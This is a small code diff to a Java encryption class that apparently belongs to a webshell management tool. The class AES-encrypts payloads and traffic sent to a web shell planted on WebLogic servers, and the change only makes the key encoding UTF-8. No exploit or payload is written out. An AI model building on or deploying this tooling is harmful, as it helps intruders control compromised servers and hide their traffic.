@@ -3,6 +3,7 @@ package shells.cryptions.JavaAes;
 import core.imp.Cryption;
 import core.shell.ShellEntity;
 import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import util.Log;
@@ -33,8 +34,8 @@ public class JavaAesWeblogic implements Cryption {
       try {
          this.encodeCipher = Cipher.getInstance("AES");
          this.decodeCipher = Cipher.getInstance("AES");
-         this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
-         this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
+         this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(StandardCharsets.UTF_8), "AES"));
+         this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(StandardCharsets.UTF_8), "AES"));
          this.payload = this.shell.getPayloadModule().getPayload();
          if (this.payload != null) {
             this.http.sendHttpResponse(this.payload);
